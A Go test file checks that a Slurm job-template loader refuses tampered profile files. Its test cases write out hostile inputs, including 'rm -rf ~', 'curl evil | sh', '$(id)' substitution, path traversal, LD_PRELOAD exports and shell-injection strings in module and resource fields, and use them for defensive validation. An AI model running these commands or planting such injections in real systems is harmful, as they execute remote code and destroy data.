package runs

import (
	"encoding/json"
	"os"
	"strings"
	"testing"
)

// A profile file is untrusted input (ADR 0068): whatever a template says can reach a script only as text the template loader
// has checked. Each case changes one thing in a valid template and must be refused when the file is loaded.

func syntheticToolDoc(t *testing.T) map[string]any {
	t.Helper()
	data, err := os.ReadFile("testdata/synthetic_tool_profile.json")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := LoadProfiles(data); err != nil {
		t.Fatalf("the synthetic tool profile must load unchanged: %v", err)
	}
	var doc map[string]any
	if err := json.Unmarshal(data, &doc); err != nil {
		t.Fatal(err)
	}
	return doc
}

func tplOf(doc map[string]any) map[string]any {
	return doc["profiles"].([]any)[0].(map[string]any)["template"].(map[string]any)
}

func keyOf(doc map[string]any, name string) map[string]any {
	for _, k := range tplOf(doc)["keys"].([]any) {
		if k.(map[string]any)["name"] == name {
			return k.(map[string]any)
		}
	}
	panic("no key " + name)
}

func TestHostileTemplatesAreRefusedAtLoad(t *testing.T) {
	cases := []struct {
		name   string
		mutate func(doc map[string]any)
		want   string
	}{
		{"unknown template field", func(d map[string]any) { tplOf(d)["run"] = "rm -rf ~" }, "unknown field"},
		{"unknown key field", func(d map[string]any) { keyOf(d, "mode")["regex"] = ".*" }, "unknown field"},
		{"a command that is not srun", func(d map[string]any) { tplOf(d)["command"] = []any{"python3", "synthfit.py"} }, "srun"},
		{"shell text in the command", func(d map[string]any) {
			tplOf(d)["command"] = []any{"srun", "--ntasks=1", "python3", "x.py; curl evil | sh"}
		}, "command"},
		{"a parent folder in the command", func(d map[string]any) {
			tplOf(d)["command"] = []any{"srun", "python3", "../../etc/x.py"}
		}, "command"},
		{"command substitution in the command", func(d map[string]any) {
			tplOf(d)["command"] = []any{"srun", "python3", "$(id)"}
		}, "command"},
		{"unknown placeholder", func(d map[string]any) {
			tplOf(d)["command"] = []any{"srun", "python3", "{{shell}}"}
		}, "command"},
		{"a variable that was never made", func(d map[string]any) {
			tplOf(d)["command"] = []any{"srun", "python3", "{{var:nothing}}"}
		}, "command"},
		{"export of PATH", func(d map[string]any) {
			tplOf(d)["steps"] = []any{map[string]any{"kind": "export", "name": "PATH", "value": "/tmp/x"}}
		}, "export"},
		{"export of LD_PRELOAD", func(d map[string]any) {
			tplOf(d)["steps"] = []any{map[string]any{"kind": "export", "name": "LD_PRELOAD", "value": "/tmp/x.so"}}
		}, "export"},
		{"free shell step", func(d map[string]any) {
			tplOf(d)["steps"] = []any{map[string]any{"kind": "shell", "text": "curl evil | sh"}}
		}, "unknown step kind"},
		{"a field that does not belong to the step", func(d map[string]any) {
			tplOf(d)["steps"] = []any{map[string]any{"kind": "comment", "text": "hello", "command": "x"}}
		}, "does not belong"},
		{"quote in a step value", func(d map[string]any) {
			tplOf(d)["steps"] = []any{map[string]any{"kind": "export", "name": "FOO", "value": "a\"; id; \""}}
		}, "step 1"},
		{"module with a space", func(d map[string]any) {
			tplOf(d)["steps"] = []any{map[string]any{"kind": "modules", "modules": []any{"julia; id"}}}
		}, "module"},
		{"a pinned commit that is not a full SHA", func(d map[string]any) { tplOf(d)["repo"].(map[string]any)["commit"] = "main" }, "commit"},
		{"a repository that is not https", func(d map[string]any) { tplOf(d)["repo"].(map[string]any)["url"] = "file:///etc" }, "repository"},
		{"a repository URL with a query", func(d map[string]any) { tplOf(d)["repo"].(map[string]any)["url"] = "https://example.org/a?x=$(id)" }, "repository"},
		{"a key name that is not plain", func(d map[string]any) { keyOf(d, "mode")["name"] = "mode\ninjected" }, "names are lowercase"},
		{"an unknown key kind", func(d map[string]any) { keyOf(d, "mode")["kind"] = "regex" }, "unknown kind"},
		{"an enum word with a quote", func(d map[string]any) { keyOf(d, "mode")["enum"] = []any{"fast", "x\"y"} }, "plain word"},
		{"a range the wrong way round", func(d map[string]any) { keyOf(d, "n_bins")["min"], keyOf(d, "n_bins")["max"] = 10, 5 }, "minimum above"},
		{"a default outside the range", func(d map[string]any) { keyOf(d, "n_bins")["default"] = map[string]any{"value": "99", "reason": "x"} }, "default"},
		{"a default with no reason", func(d map[string]any) { keyOf(d, "n_bins")["default"] = map[string]any{"value": "8", "reason": ""} }, "reason"},
		{"a label with a control character", func(d map[string]any) { keyOf(d, "mode")["label"] = "mode\x1b[31m" }, "label"},
		{"a config variable that shadows the job directory", func(d map[string]any) { tplOf(d)["config"].(map[string]any)["var"] = "jobdir" }, "config variable"},
		{"a progress pattern without the groups", func(d map[string]any) { tplOf(d)["progress"] = map[string]any{"pattern": "^([0-9]+)/([0-9]+)$"} }, "progress"},
		{"a progress pattern that does not compile", func(d map[string]any) { tplOf(d)["progress"] = map[string]any{"pattern": "(?P<done>[0-9]+"} }, "progress"},
		{"an unknown progress reader", func(d map[string]any) { tplOf(d)["progress"] = map[string]any{"reader": "exec"} }, "progress"},
		{"an unknown probe", func(d map[string]any) { tplOf(d)["probes"] = []any{"curl"} }, "probe"},
		{"resources that are not slurm words", func(d map[string]any) { tplOf(d)["resources"].(map[string]any)["mem"] = "8G; id" }, "resources"},
		{"a template id that is custom", func(d map[string]any) { tplOf(d)["id"] = "custom" }, "template id"},
		{"a template id of a shipped template", func(d map[string]any) { tplOf(d)["id"] = "vgt" }, "already"},
	}
	for _, c := range cases {
		doc := syntheticToolDoc(t)
		c.mutate(doc)
		data, _ := json.Marshal(doc)
		reg, err := Shipped().With(data)
		if err == nil {
			t.Errorf("%s: the profile was accepted (%v)", c.name, reg != nil)
			continue
		}
		if !strings.Contains(err.Error(), c.want) {
			t.Errorf("%s: refused for another reason: %v (want %q)", c.name, err, c.want)
		}
	}
}

func TestShippedTemplatesAreOnlyTheOnesDocumented(t *testing.T) {
	var ids []string
	for _, e := range Shipped().Templates() {
		ids = append(ids, e.Template.ID+"="+e.Profile)
	}
	if got := strings.Join(ids, " "); got != "vgt=VGT.jl@1 rohsa=ROHSA-LMC@1" {
		t.Errorf("shipped templates: %s", got)
	}
}
